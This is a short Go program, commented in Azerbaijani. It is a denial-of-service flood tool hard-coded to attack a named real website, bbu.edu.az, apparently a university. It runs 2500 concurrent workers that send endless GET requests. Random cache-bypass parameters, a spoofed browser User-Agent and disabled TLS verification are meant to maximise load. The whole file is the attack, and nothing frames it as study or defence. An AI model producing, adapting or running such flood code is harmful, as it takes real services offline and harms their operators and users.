package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"sync/atomic"
	"time"
)

var (
	target  = "bbu.edu.az:443" 
	sni     = "bbu.edu.az"
	workers = 2500
	count   uint64
	errors  uint64
)

func main() {
	fmt.Printf("[!!!] KATAKLİZM-X-FORCE (NATIVE) START: %s\n", sni)
	
	// Standart HTTP/2 Transport yaradırıq
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			ServerName:         sni,
		},
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 5000,
		ForceAttemptHTTP2:   true, // HTTP/2-ni daxili olaraq aktiv edir
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	for i := 0; i < workers; i++ {
		go func() {
			for {
				attack(client)
				// Saniyədə minlərlə sorğu üçün fasiləni minimuma endirdik
				time.Sleep(1 * time.Millisecond) 
			}
		}()
	}

	// Səssiz Hesabat
	for {
		time.Sleep(5 * time.Second)
		fmt.Printf("[HAKAI] REQ_SENT: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
	}
}

func attack(c *http.Client) {
	// Cache bypass üçün dinamik URL
	u := fmt.Sprintf("https://%s/?cache_bypass=%d&ts=%d", target, rand.Intn(999999), time.Now().UnixNano())
	
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}

	// Real brauzer başlığı
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	
	// Sorğunu göndər
	resp, err := c.Do(req)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	
	// Body-ni dərhal bağla ki, socket-lər dolsun amma boşalmasın
	resp.Body.Close()
	atomic.AddUint64(&count, 1)
}
